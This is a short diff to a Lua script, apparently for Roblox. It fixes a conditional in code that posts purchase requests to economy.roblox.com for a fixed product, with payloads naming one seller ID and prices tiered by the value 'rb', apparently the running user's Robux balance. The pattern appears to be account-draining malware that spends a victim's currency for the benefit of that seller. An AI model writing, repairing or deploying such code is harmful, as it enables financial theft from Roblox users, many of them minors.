@@ -51,9 +51,7 @@ local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":43
 local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":4333856178}'
 local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":4333856178}'
 
-if rb = 0 then
-
-elseif rb > 0 and rb < 15 then
+if rb > 0 and rb < 15 then
 x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1742727543", baba)
 wait()
 elseif rb >= 15 and rb < 25 then
